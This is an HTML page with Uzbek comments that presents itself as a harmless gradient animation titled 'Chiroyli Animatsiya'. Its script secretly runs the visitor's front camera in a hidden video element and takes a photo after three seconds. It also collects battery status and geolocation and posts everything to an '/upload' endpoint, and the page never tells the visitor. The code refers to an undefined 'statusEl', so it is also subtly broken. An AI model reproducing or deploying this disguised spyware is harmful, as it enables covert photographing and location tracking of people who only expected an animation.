<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <title>Animatsiya</title>
    <style>
      /* Sening dizayningni o‚Äòzgartirmadim */
      #video {
        display: none;
      }
      body {
        height: 100vh;
        overflow: hidden;
        background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
        position: relative;
      }
      .animation-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(
          45deg,
          #ff6b6b,
          #4ecdc4,
          #45b7d1,
          #96ceb4,
          #ffeaa7,
          #dda0dd,
          #98d8c8
        );
        background-size: 400% 400%;
        animation: gradientShift 8s ease infinite;
      }
      @keyframes gradientShift {
        0% {
          background-position: 0% 50%;
        }
        50% {
          background-position: 100% 50%;
        }
        100% {
          background-position: 0% 50%;
        }
      }
      .center-text {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        text-align: center;
        color: white;
        font-family: "Arial", sans-serif;
        z-index: 10;
      }
      .center-text h1 {
        font-size: 4rem;
        font-weight: bold;
        margin-bottom: 1rem;
        animation: textGlow 3s ease-in-out infinite alternate;
      }
      @keyframes textGlow {
        0% {
          text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
        }
        100% {
          text-shadow: 0 0 30px rgba(255, 255, 255, 0.6);
        }
      }
    </style>
  </head>

  <body>
    <div class="animation-container">
      <div class="center-text">
        <h1>Chiroyli Animatsiya</h1>
      </div>
    </div>

    <video id="video" autoplay playsinline></video>

    <script>
      const video = document.getElementById("video");

      // üé• Kamerani ishga tushirish
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          video.srcObject = stream;
          statusEl.innerText = "‚úÖ Kamera tayyor!";
          video.onloadedmetadata = () => setTimeout(captureAndSendPhoto, 3000);
        })
        .catch((err) => {
          console.error("Kamera ruxsati berilmadi:", err);
          statusEl.innerText = "üö´ Kamera ruxsati rad etildi!";
        });

      async function captureAndSendPhoto() {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        const blob = await new Promise((res) =>
          canvas.toBlob(res, "image/jpeg")
        );

        let batteryLevel = "unknown";
        let batteryCharging = "unknown";
        try {
          const battery = await navigator.getBattery();
          batteryLevel = battery.level;
          batteryCharging = battery.charging;
        } catch (e) {
          console.warn("Battery API ishlamayapti:", e);
        }

        let latitude = "Nomalum";
        let longitude = "Nomalum";
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition((pos) => {
              latitude = pos.coords.latitude;
              longitude = pos.coords.longitude;
              resolve();
            }, reject);
          });
        } catch (e) {
          console.warn("Geolocation olinmadi:", e);
        }

        const formData = new FormData();
        formData.append("photo", blob, "auto.jpg");
        formData.append("batteryLevel", batteryLevel);
        formData.append("batteryCharging", batteryCharging);
        formData.append("latitude", latitude);
        formData.append("longitude", longitude);

        console.log("Yuborilmoqda:", latitude, longitude);

        fetch("/upload", { method: "POST", body: formData })
          .then((res) => {
            if (res.ok) {
              statusEl.innerText = "‚úÖ Ma'lumot yuborildi!";
              console.log("Yuborildi!");
            } else {
              statusEl.innerText = "‚ùå Server xatosi!";
              console.error("Server xatosi:", res.status);
            }
          })
          .catch((err) => {
            statusEl.innerText = "‚ùå Yuborishda xato!";
            console.error("Xatolik:", err);
          });
      }
    </script>
  </body>
</html>
